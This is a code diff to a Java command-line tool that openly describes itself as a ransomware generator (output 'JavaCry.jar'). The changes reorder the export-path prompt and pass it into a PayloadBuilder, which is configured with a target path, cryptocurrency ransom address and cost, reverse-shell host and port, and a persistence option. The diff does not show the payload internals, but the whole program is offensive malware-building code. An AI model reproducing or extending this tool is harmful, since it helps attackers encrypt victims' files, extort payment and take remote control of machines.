@@ -160,14 +160,10 @@ public class JRF {
                     }
                 }
                 
-                PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
+                PayloadBuilder builder = new PayloadBuilder(tgtPath, expPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
                 builder.build();
                 builder.compile();
-                try {
-                    Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(expPath, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
-                } catch (Exception e) {
-                    System.out.println(e);
-                }
+
                 System.out.println("Ransomware generated! " + expPath);
                 System.exit(0);
             } else {
@@ -221,20 +217,15 @@ public class JRF {
                     usePersistence = (input.nextLine().toLowerCase().equals("y"));
                 }
 
-                PayloadBuilder builder = new PayloadBuilder(path, CryptAddress, cost, useRevShell, usePersistence, IP, port);
+                System.out.print("Please specify export path: ");
+                String pth = input.nextLine();
+
+                PayloadBuilder builder = new PayloadBuilder(path, pth, CryptAddress, cost, useRevShell, usePersistence, IP, port);
                 builder.build();
                 builder.compile();
                 System.out.println("Ransomware generated!");
 
                 // String[] envp = {"HOME=" + System.getProperty("user.home")};
-
-                System.out.print("Please specify export path: ");
-                String pth = input.nextLine();
-                try {
-                    Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(pth, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
-                } catch (Exception e) {
-                    System.out.println(e);
-                }
                 
                 System.out.print("Would you like to open the main server? (y/n): ");
                 boolean openMainServer = (input.nextLine().toLowerCase().equals("y"));
